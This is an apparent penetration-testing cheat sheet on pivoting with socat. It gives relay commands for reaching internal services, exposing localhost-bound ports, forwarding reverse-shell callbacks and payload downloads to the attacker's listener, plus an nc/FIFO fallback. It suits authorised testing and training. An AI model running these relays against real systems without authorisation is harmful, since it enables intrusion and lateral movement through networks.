# socat relays

## Is it there
which socat
- [ ] None: a static socat, built from socat's source at http://www.dest-unreach.org/socat/ since it publishes no binaries, in the target's upload/ folder, fetched with the line serve files prints, then chmod +x and run as ./socat
- [ ] A Windows pivot: :Pb port-forwarding instead
- [ ] A whole network rather than a port or two: :Pb ligolo

## An internal service on a pivot port
On the pivot:
socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<InternalIP>:<Port> &
From Kali, against the pivot:
nc -nv <PivotIP> <LPORT>
nmap -sT -Pn -sV -p <LPORT> <PivotIP>
- [ ] fork is there, or it serves one connection and exits
- [ ] A normal user listens only above 1024
- [ ] The pivot's firewall lets <LPORT> in

## A service on the pivot's own localhost
From ss -tlnp, a service bound to 127.0.0.1 on the pivot, opened to the network:
socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:127.0.0.1:<Port> &
nc -nv <PivotIP> <LPORT>

## Callbacks from the internal network
On the pivot, its port relayed to my listener:
socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<LHOST>:<LPORT> &
rlwrap nc -lvnp <LPORT>
- [ ] The payload goes to the pivot's address on <Subnet>/<CIDR>, <PivotInternalIP>, on <LPORT>: :Pb shells
Downloads the same way, to serve's port, which is 80 as root and 8000 otherwise:
socat TCP-LISTEN:8080,fork,reuseaddr TCP:<LHOST>:80 &
- [ ] The line serve files prints, with <LHOST> changed to <PivotInternalIP>:8080

## UDP
SNMP, DNS or TFTP on an internal host:
socat UDP-LISTEN:<LPORT>,fork,reuseaddr UDP:<InternalIP>:<Port> &

## No socat
One connection at a time, with nc and a FIFO:
rm -f /tmp/f; mkfifo /tmp/f; nc -lvnp <LPORT> < /tmp/f | nc <InternalIP> <Port> > /tmp/f
- [ ] It ends after the first connection: start it again for the next

## Stop it
jobs
kill %1
pkill socat
- [ ] Nothing of mine left listening on the pivot: ss -tlnp
